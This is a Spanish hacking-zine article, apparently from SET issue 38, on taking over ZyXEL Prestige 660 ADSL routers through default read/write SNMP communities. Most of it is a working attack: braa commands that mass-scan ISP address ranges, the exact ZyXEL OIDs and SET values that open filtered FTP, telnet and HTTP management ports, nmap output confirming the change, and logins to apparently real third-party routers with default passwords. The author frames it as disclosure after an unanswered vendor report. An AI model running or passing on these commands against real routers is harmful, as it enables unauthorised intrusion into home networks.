@@ -1,0 +1,790 @@
+-[ 0x07 ]--------------------------------------------------------------------
+-[ Hacking ZyXEL Prestige 660 ]----------------------------------------------
+-[ by d00han.t3am ]--------------------------------------------------SET-38--
+
+
+                         Hacking ZyXEL Prestige 660
+                  Autor: d00han.t3am - d00han.t3am@gmail.com
+
+
+
+<S3ns1b1l1dAd hack3er>
+
+Son las 02.17 a.m y mis dos chicas estan durmiendo desde hace 3 horas.
+El trabajo oficial, el no oficial, la familia y hack hacen que dormir sea
+un lujo. A las 06.45 a.m. en pie y a exprimir otro dia como si fuera el
+ultimo.
+
+Tras releer un SET, el numero 35 concretamente, me invadieron unas ganas
+enormes de ponerme a escribir cosas que no todo el mundo sabe. En la
+Editorial de dicho numero "el nuevo Editor" nos incitaba a los lectores a
+escribir tras motivarnos con un ejemplo.
+
+Vale, ahora entendereis porque este articulo se lo dedico a Daniela, mi hija.
+Somos los mejores!
+
+</S3ns1b1l1dAd hack3er>
+
+
+
+[=][=][=][=][=][=][=][=][=][=][=][=][=]
+[  Hacking Zyxel Prestige 600 series  ]
+[=][=][=][=][=][=][=][=][=][=][=][=][=]
+
+Desde hace tiempo utilizo las tecnicas que voy a exponer para mis propios
+fines. He avisado a las empresas aludidas, como son el fabricante "ZyXEL"
+y el distribuidor/proveedor de servicios "Telefonica" sin obtener respuesta.
+Pues nada, ha llegado la hora de hacerlo publico.
+
+A~os atras se descubrieron ciertas vulnerabilidades que en teoria podrian
+revelar informacion sensible y realizar ciertos cambios de configuracion
+(no se indican cuales ni como).
+(Ref: http://www.juniper.net/security/auto/vulnerabilities/vuln27918.html)
+En todo caso, en este "paper" se describe como saltarse el filtrado de
+puertos de administracion de forma practica.
+
+
+Para quien no lo sepa, estos routers ADSL son los que dan acceso a una gran
+parte de la poblacion en Espa~a gracias al proveedor de servicios "Telefonica
+de Espanya". Los ha estado instalado durante mas de 3 anyos si no me equivoco.
+
+Los routers vulnerables al ataque que se describira son concretamente los
+Prestige P-660HW-D1,  P-660R-D1 y el mas antiguo P-650HW-31. 
+
+Por defecto, algunos routers de la serie 600 traen el servicio SNMP activado
+con su respectivo puerto UDP 161 abierto accesible desde la interface LAN y
+WAN. Esto en si no es un problema siempre y cuando se proteja por contrase~a
+y no se pueda modificar nada. Pues normalmente no es asi, es decir, la
+contrase~a de lectura o GET es "public" y la de escritura o SET es "public"
+y no existe ningun tipo de filtrado a este puerto/protocolo.
+
+Normalmente, el protocolo SNMP y los datos a los que se acceden se utilizan
+para monitorizar el estado del dispositivo. La brecha de seguridad se abre
+aqui, pero realmente el problema viene cuando podemos MODIFICAR la
+configuracion del dispositivo a nuestro antojo.
+
+Entre otras delicias, podemos:
+
+* Conocer direcciones IPs asignadas por DHCP en la LAN
+* Conocer las MACs de los dispositivos de la LAN (y por tanto sus marcas-modelo)
+* Conocer y cambiar el nombre del dispositivo. Saber el tiempo que lleva online.
+* Inyectar codigo XSS que nos revele la password de admin del router (no se
+  trata aqui)
+* ABRIR puertos filtrados hacia la interfaz WAN ;) *** increible, pero sigue
+  leyendo ***
+
+Una vez que los puertos estan abiertos ya depedende de la imaginacion de cada
+uno hasta donde se puede llegar, a mi de pronto se me ocurre:
+
+* Entrar en la interface web o telnet (con las pass por defecto o fuerza bruta)
+  y redirijir los puertos NetBios/RPC/VNC/Terminal Server a una maquina Windows
+  del interior o los equivalentes para un servidor linux
+
+
+
+[=][=][=][=][=][=][=][=][=]
+[  Conocimientos previos  ]
+[=][=][=][=][=][=][=][=][=]
+
+Pues como minimo te recomiendo que sepas algo de SNMP, MIBs, TELNET y utilizar
+el Nmap aunque si no te suena nada de lo que he expuesto hasta ahora pues...
+lo tienes crudo.
+
+Aqui referencio algo de culturilla:
+
+   * http://es.wikipedia.org/wiki/SNMP
+   * http://es.wikipedia.org/wiki/MIB
+   * http://www.zyxel.es/descargas09/Actualizacion%20Firmware%20Telefonica%20
+     en%20Routers%20ZyXEL.pdf
+   * http://www.zyxel.es/descargas09/ (documentacion actualizada Zyxel)
+   * http://www.oidview.com/mibs/890/ZYXEL-MIB.html  ¡¡¡¡ OIDs de ZyXEL !!!!
+   * google: SNMPv2-MIB.iso.org.dod.internet  
+
+Dicho de manera muy simple, el protocolo SNMP utiliza MIBs para intereaccionar
+con el dispositivo. Por ejemplo, si hacemos una peticion SNMP a un router usando
+la OID .1.3.6.1.2.1.1.1.0 nos respondera con un string indicando el Modelo.
+
+Una MIB digamos que es una base de datos de OIDs para interaccionar con un
+dispositivo via protocolo SNMP. Las MIBs que utilizamos aqui no son las
+"estandar" ;) . Son especificas de los routers ZyXEL y es mas, muchas de ellas
+tampoco aparecen en la documentacion oficial, se han obtenido, digamos que,
+por fuerza bruta. Las OIDs estan estructuradas jerarquicamente y "andando" por
+ellas y bajando de nivel podemos encontrar sorpresas; sorpresas que nos pueden
+ayudar a cambiar la configuracion sin permisos de administrador.
+
+ZyXEL por ejemplo, tiene MIBs propias, se encabezan bajo la jeraquia:
+
+     :.1.3.6.1.4.1.890.1.x.y.z
+
+
+
+[=][=][=][=][=][=]
+[  Herramientas  ]
+[=][=][=][=][=][=]
+
+En Linux podemos usar (incuido en BackTrack 3/4)
+
+ * braa 
+
+En Windows podemos utilizar:
+ 
+ * Mib Browser - http://www.ireasoning.com/downloadmibbrowserfree.php 
+
+Para ambos S.O. debemos disponer de Nmap y de algun escaner SNMP como el
+que incluye IP-Tools 2.0. En linux nos sobra con **braa** para hacer todo
+el trabajo.
+
+
+
+[=][=][=][=][=][=][=]
+[  El procedimiento ]
+[=][=][=][=][=][=][=]
+
+ * Identificar a la victima usando un escaner SNMP (recordad que esta penado
+   civilmente escanear IPs que no sean tuyas propias)
+ * Una vez identificada, ver si tiene abiertos los puertos de administracion
+   telnet, www y ftp.
+ * Si no los tiene abiertos, modificar la configuracion de filtrado usando
+   OIDs especificas.
+ * Lanzar un navegador web contra la aplicacion de configuracion http o un
+   telnet hacia el puerto 23
+ * Hacerse con un manual del modelo hackeado especifico y dejar volar la
+   imaginacion.
+
+
+
+Manos a la obra  (las IPs han sido modificadas para evitar suspicacias)
+===============
+
+ * Escojo un rango IP que se de antemano que esta poblado de este tipo de
+   routers. Por ejemplo: 88.22.xyz.1 a 88.22.xyz.254
+ * Le decimos a **braa** que mire en ese rango 
+ * Todos los routers que responden a un GET public:
+
+bt ~ # braa public@88.18.11.1-88.18.11.254:161:.1.3.6.1.2.1.1.1.0
+88.22.xyz.253:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.250:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.231:96ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.212:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.210:96ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.208:100ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.202:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.196:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.197:100ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.191:88ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.189:104ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.22.xyz.144:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.132:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.125:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.149:204ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.124:108ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.115:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.109:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.108:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.105:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.93:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.22.xyz.82:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.80:104ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.22.xyz.49:4ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.42:104ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.31:96ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.22.xyz.25:120ms:.1.3.6.1.2.1.1.1.0:Prestige 660R-61C
+88.22.xyz.22:108ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.22.xyz.194:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61 *** DEMO 3
+88.22.xyz.7:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.6:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.22.xyz.100:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1 ********** DEMO 1
+88.22.xyz.244:920ms:.1.3.6.1.2.1.1.1.0:P-660R-D1  ********** DEMO 2
+88.22.xyz.145:1020ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+bt ~ #  
+
+
+DEMO 1: Modelo P-660HW-D1
+=========================
+
+ * OID del modelo: .1.3.6.1.2.1.1.1.0
+
+ # ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.2.1.1.1.0
+ 88.22.xyz.100:110ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+ 1 queries made, 1 queries acknowledged.
+
+ * Vemos como tiene los puertos
+
+ $ sudo nmap -p 80,21,23 88.22.xyz.100
+
+ Starting Nmap 4.53 ( http://insecure.org ) at 2009-06-22 19:12 CEST
+ Interesting ports on 100.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.100):
+ PORT   STATE    SERVICE
+ 21/tcp filtered ftp
+ 23/tcp filtered telnet
+ 80/tcp filtered http
+
+Nmap done: 1 IP address (1 host up) scanned in 2.399 seconds
+
+ * Leemos con una OID "especial" el estado de los filtros.
+ * Hacemos un GET con la OID .1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+
+ 
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+88.22.xyz.100:138ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:80
+
+ * Como vemos, el resultado es "80". Interpreto que es el puerto 80 el que esta
+   filtrado.
+ * Con la OID :.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5 nos muestra 21 (ftp) y 
+   con :.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6 nos indica 23 (telnet) ¡¡ Que
+   interesante !!
+
+ * Vamos a cambiar los valores  ¡¡¡ a ver que pasa !!!
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+=i81
+88.22.xyz.100:2044ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:OK, set.
+1 queries made, 1 queries acknowledged.
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5
+=i22
+88.22.xyz.100:2051ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5:OK, set.
+1 queries made, 1 queries acknowledged.
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6
+=i24
+88.22.xyz.100:2048ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6:OK, set.
+1 queries made, 1 queries acknowledged.
+
+  
+ * Volvemos a ejecutar Nmap
+
+
+socrates@CENTRAL:~$ sudo nmap -p 80,21,23 88.22.xyz.100
+
+Starting Nmap 4.53 ( http://insecure.org ) at 2009-06-22 19:09 CEST
+Interesting ports on 100.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.100):
+PORT   STATE SERVICE
+21/tcp open  ftp
+23/tcp open  telnet
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.351 seconds
+
+ * Jajajajajaja Maaaagia. Aparecen ahora abiertos para toda internet.
+
+ * Probamos lanzar un telnet contra el router. La clave es la que viene por
+   defecto en estos modelos.
+ * Piensa que si su propietario tiene activada por defecto la gestion SNMP
+   tambien tendra la pass por defecto, tendra el SSID wifi y la WEP128 por
+   defecto, etc, etc.
+
+root@CENTRAL:/home/socrates/braa-0.82# telnet  88.22.xyz.100
+Trying 88.22.xyz.100...
+Connected to 88.22.xyz.100.
+Escape character is '^]'.
+
+Password: ****
+
+                    Copyright (c) 1994 - 2006 ZyXEL Communications Corp.
+
+                              P-660HW-D1 Main Menu
+
+     Getting Started                      Advanced Management
+       1. General Setup                     21. Filter Set Configuration
+       2. WAN Backup Setup                  22. SNMP Configuration
+       3. LAN Setup                         23. System Security
+       4. Internet Access Setup             24. System Maintenance
+                                            25. IP Routing Policy Setup
+     Advanced Applications                  26. Schedule Setup
+       11. Remote Node Setup
+       12. Static Routing Setup
+       14. Dial-in User Setup               99. Exit
+       15. NAT Setup
+
+
+
+
+
+                          Enter Menu Selection Number: 99
+
+
+Connection closed by foreign host.
+
+ * Seamos buenos. Vamos a dejarlo como lo encontramos. Volvemos a SETear las
+   OIDs a sus valores originales.
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+=i80
+88.22.xyz.100:2044ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:OK, set.
+1 queries made, 1 queries acknowledged.
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5
+=i21
+88.22.xyz.100:2051ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5:OK, set.
+1 queries made, 1 queries acknowledged.
+
+# ./braa -v -t 5 -p 200 public@88.22.xyz.100:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6
+=i23
+88.22.xyz.100:2048ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6:OK, set.
+1 queries made, 1 queries acknowledged.
+
+
+
+DEMO 2: MODELO P-660R-D1
+========================
+
+ * Seguimos el mismo procedimiento.
+
+bt ~ # braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.2.1.1.1.0
+88.22.xyz.244:110ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+1 queries made, 1 queries acknowledged.
+bt ~ # 
+
+ * Veamos los puertos que nos interesan en que estado se encuentran.
+
+bt ~ # nmap -v -PN 88.22.xyz.244 -p21,23,80
+
+Starting Nmap 4.60 ( http://nmap.org ) at 2009-06-24 01:00 GMT
+Initiating Parallel DNS resolution of 1 host. at 01:00
+Completed Parallel DNS resolution of 1 host. at 01:00, 0.08s elapsed
+Initiating SYN Stealth Scan at 01:00
+Scanning 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) [3 ports]
+Completed SYN Stealth Scan at 01:00, 3.03s elapsed (3 total ports)
+Host 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) appears to be
+up ... good.
+Interesting ports on 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244):
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+23/tcp filtered telnet
+80/tcp filtered http
+
+Read data files from: /usr/local/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.143 seconds
+           Raw packets sent: 6 (264B) | Rcvd: 0 (0B)
+
+ * Bueno, estan filtrados, veamos si de dejan abrir. Ejecutemos el SET con los
+   OIDs conocidos:
+
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+=i81
+88.22.xyz.244:2107ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:OK, set.
+1 queries made, 1 queries acknowledged.
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5
+=i22
+88.22.xyz.244:2109ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5:OK, set.
+1 queries made, 1 queries acknowledged.
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6
+=i24
+88.22.xyz.244:2111ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6:OK, set.
+1 queries made, 1 queries acknowledged.
+#
+
+ * Ahora veamos con Nmap si han cambiado el estado de los puertos afectados.
+
+bt ~ # nmap -v -PN 88.22.xyz.244 -p21,23,80
+
+Starting Nmap 4.60 ( http://nmap.org ) at 2009-06-24 01:07 GMT
+Initiating Parallel DNS resolution of 1 host. at 01:07
+Completed Parallel DNS resolution of 1 host. at 01:07, 0.08s elapsed
+Initiating SYN Stealth Scan at 01:07
+Scanning 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) [3 ports]
+Discovered open port 80/tcp on 88.22.xyz.244
+Discovered open port 23/tcp on 88.22.xyz.244
+Discovered open port 21/tcp on 88.22.xyz.244
+Completed SYN Stealth Scan at 01:07, 0.11s elapsed (3 total ports)
+Host 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) appears to be
+up ... good.
+Interesting ports on 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244):
+PORT   STATE SERVICE
+21/tcp open  ftp
+23/tcp open  telnet
+80/tcp open  http
+
+Read data files from: /usr/local/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.222 seconds
+           Raw packets sent: 3 (132B) | Rcvd: 3 (138B)
+
+
+ * Eurekaaaaa!!!
+
+$$ Vamos a lanzar un telnet, aunque podriamos acceder a la interfaz web,
+$$ pero esta no es la revisa adeacuada para ello ;P
+
+bt ~ # telnet 88.22.xyz.244
+Trying 88.22.xyz.244...
+Connected to 88.22.xyz.244.
+Escape character is '^]'.
+
+Password: ****
+
+
+                    Copyright (c) 1994 - 2006 ZyXEL Communications Corp.
+
+                              P-660R-D1  Main Menu
+
+     Getting Started                      Advanced Management
+       1. General Setup                     21. Filter Set Configuration
+       2. WAN Backup Setup                  22. SNMP Configuration
+       3. LAN Setup                         23. System Password
+       4. Internet Access Setup             24. System Maintenance
+                                            25. IP Routing Policy Setup
+     Advanced Applications                  26. Schedule Setup
+       11. Remote Node Setup
+       12. Static Routing Setup
+       15. NAT Setup                        99. Exit
+
+
+
+
+
+
+                          Enter Menu Selection Number: 99
+
+
+Connection closed by foreign host.
+
+
+ * Bueno... que carajo... vamos a lanzar un lynx contra el puerto http,
+   Viva el ASCII 8)
+
+bt ~ # lynx 88.22.xyz.244
+
+Username for 'P-660R-D1 ' at server '88.22.xyz.244': ****
+Password: ****
+
+                                                              Web Configurator
+
+   Site Map
+   ___________________________________________________________________________
+
+
+   Wizard Setup     Advanced Setup     Maintenance
+   Wizard Setup Password
+   LAN
+   WAN
+   NAT
+   Security
+   Dynamic DNS
+   Time and Date
+   Remote Management
+   UPnP
+   Logs System Status
+   DHCP Table
+   Diagnostic
+   Firmware
+   If you see this message, it means you need a more CSS-compatible browser.
+   Such as MS Internet Explorer 4.0 or above.
+   ___________________________________________________________________________
+
+ * Te ha gustado la experiencia de navegar en texto plano? A nuestro "editor"
+   tambien ;)
+
+
+ * Lo dejamos todo como estaba... probrecitos ;(
+
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+=i80
+88.22.xyz.244:2109ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:OK, set.
+1 queries made, 1 queries acknowledged.
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6
+=i23
+88.22.xyz.244:2109ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.6:OK, set.
+1 queries made, 1 queries acknowledged.
+# braa -v -t 5 -p 200 public@88.22.xyz.244:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5
+=i21
+88.22.xyz.244:2108ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.5:OK, set.
+1 queries made, 1 queries acknowledged.
+# nmap -v -PN 88.22.xyz.244 -p21,23,80
+
+Starting Nmap 4.60 ( http://nmap.org ) at 2009-06-24 01:18 GMT
+Initiating Parallel DNS resolution of 1 host. at 01:18
+Completed Parallel DNS resolution of 1 host. at 01:18, 0.08s elapsed
+Initiating SYN Stealth Scan at 01:18
+Scanning 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) [3 ports]
+Completed SYN Stealth Scan at 01:18, 3.02s elapsed (3 total ports)
+Host 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244) appears to be
+up ... good.
+Interesting ports on 244.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.244):
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+23/tcp filtered telnet
+80/tcp filtered http
+
+Read data files from: /usr/local/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.133 seconds
+           Raw packets sent: 6 (264B) | Rcvd: 0 (0B)
+            
+
+
+
+
+DEMO 3: MODELO P-660HW-61
+=========================
+
+ * Identificamos
+
+bt ~ # braa -v -t 5 -p 200 public@88.22.xyz.194:.1.3.6.1.2.1.1.1.0
+88.22.xyz.194:108ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+1 queries made, 1 queries acknowledged.
+
+ * Vemos los puertos
+
+bt ~ # nmap -v -PN -p21,23,80 88.22.xyz.194
+
+Starting Nmap 4.60 ( http://nmap.org ) at 2009-06-24 00:03 GMT
+Initiating Parallel DNS resolution of 1 host. at 00:03
+Completed Parallel DNS resolution of 1 host. at 00:03, 0.28s elapsed
+Initiating SYN Stealth Scan at 00:03
+Scanning 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194) [3 ports]
+Completed SYN Stealth Scan at 00:03, 0.10s elapsed (3 total ports)
+Host 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194) appears to be
+up ... good.
+Interesting ports on 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194):
+PORT   STATE  SERVICE
+21/tcp closed ftp
+23/tcp closed telnet
+80/tcp closed http
+
+Read data files from: /usr/local/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.418 seconds
+           Raw packets sent: 3 (132B) | Rcvd: 3 (138B)
+
+ * Este modelo muestra como cerrados los puertos 80, 21, 23 al contrario
+   de lo que pasaba con el anterior que los mostraba filtrados.
+
+
+ * Consultamos las oids anteriores para asegurarnos de que existen
+
+# braa -v -t 5 -p 200 public@88.22.xyz.194:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4
+88.22.xyz.194:108ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.10.4:Error [2] No such name.
+1 queries made, 1 queries acknowledged.
+
+ * Mal vamos, a este router no le suenan esta OID.
+   En este modelo se usa otro grupo de OIDs para cambiar el filtro. 
+   Como lo se...? Lo se. OID: .1.3.6.1.4.1.890.1.2.1.5.2.1.8.12.1
+
+
+# braa public@88.22.xyz.194:161:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.12.1=24
+88.22.xyz.194:2095ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.12.1:OK, set.
+
+ * Bien, nos responde "OK, set". Veamos ahora que nos dice Nmap sobre el puerto
+   TELNET
+
+bt ~ # nmap -v -PN -p21,23,80 88.22.xyz.194
+
+Starting Nmap 4.60 ( http://nmap.org ) at 2009-06-24 00:20 GMT
+Initiating Parallel DNS resolution of 1 host. at 00:20
+Completed Parallel DNS resolution of 1 host. at 00:20, 0.12s elapsed
+Initiating SYN Stealth Scan at 00:20
+Scanning 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194) [3 ports]
+Completed SYN Stealth Scan at 00:20, 0.11s elapsed (3 total ports)
+Host 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194) appears to be
+up ... good.
+Interesting ports on 194.Red-88-22-xyz.staticIP.rima-tde.net (88.22.xyz.194):
+PORT   STATE  SERVICE
+21/tcp closed ftp
+23/tcp closed telnet
+80/tcp closed http
+
+Read data files from: /usr/local/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.261 seconds
+           Raw packets sent: 3 (132B) | Rcvd: 3 (138B)
+
+bt ~ # telnet 88.22.xyz.194
+Trying 88.22.xyz.194...
+telnet: connect to address 88.22.xyz.194: Connection refused
+
+
+ * Que sorpresa!, NO es vulnerable a pesar de poder modificar
+   los valores de filtrado.
+ * Para vuestra informacion el 650HW-31 tampoco es vulnerable
+   o al menos usando estas oids :-?
+
+ * Lo volvemos a dejar como estaba antes de experimentar
+
+bt ~ # braa public@88.22.xyz.194:161:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.12.1=23
+88.22.xyz.194:2097ms:.1.3.6.1.4.1.890.1.2.1.5.2.1.8.12.1:OK, set.
+                                                          
+
+
+[=][=][=][=][=]
+[  MISCELANEA ]
+[=][=][=][=][=]
+
+OIDs varias para un mejor hacking ;)
+====================================
+
+ * Que quereis saber que MAC tiene la IP interna 192.168.1.33 pues nada....
+
+# ./braa -v -t 5 -x -p 200 public@88.22.xyz.100:.1.3.6.1.2.1.4.22.1.2.1.192.168.
+1.33
+88.22.xyz.100:107ms:.1.3.6.1.2.1.4.22.1.2.1.192.168.1.33:001f169c4a24
+
+ * Listar los interfaces de red: 
+
+OID: .1.3.6.1.2.1.2.2.1.2.1
+Value: enet0
+
+OID: .1.3.6.1.2.1.2.2.1.2.2
+Value: enet1
+
+OID: .1.3.6.1.2.1.2.2.1.2.3
+Value: pppoe
+
+ * Todos los routers que responden a un GET public:
+
+bt ~ # braa public@88.18.11.1-88.18.11.254:161:.1.3.6.1.2.1.1.1.0
+88.18.11.253:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.250:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.231:96ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.212:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.210:96ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.208:100ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.202:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.196:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.197:100ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.191:88ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.189:104ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.18.11.144:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.132:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.125:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.149:204ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.124:108ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.115:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.109:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.108:104ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.105:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.93:104ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.82:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.80:104ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.18.11.49:4ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.42:104ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.31:96ms:.1.3.6.1.2.1.1.1.0:Prestige 2602HWL-61C
+88.18.11.25:120ms:.1.3.6.1.2.1.1.1.0:Prestige 660R-61C
+88.18.11.22:108ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.19:100ms:.1.3.6.1.2.1.1.1.0:Prestige 660HW-61
+88.18.11.7:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.6:96ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.1:100ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+88.18.11.146:920ms:.1.3.6.1.2.1.1.1.0:P-660R-D1
+88.18.11.145:1020ms:.1.3.6.1.2.1.1.1.0:P-660HW-D1
+bt ~ #  
+
+ * Todos los P-660R-D1
+
+bt ~ # braa public@88.22.xyz.100-88.22.xyz.254:161:.1.3.6.1.4.1.890.1.2.6.60
+88.22.xyz.244:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.236:88ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.231:104ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.229:96ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
+88.22.xyz.226:100ms:.1.3.6.1.4.1.890.1.2.6.60:Error [2] No such name.
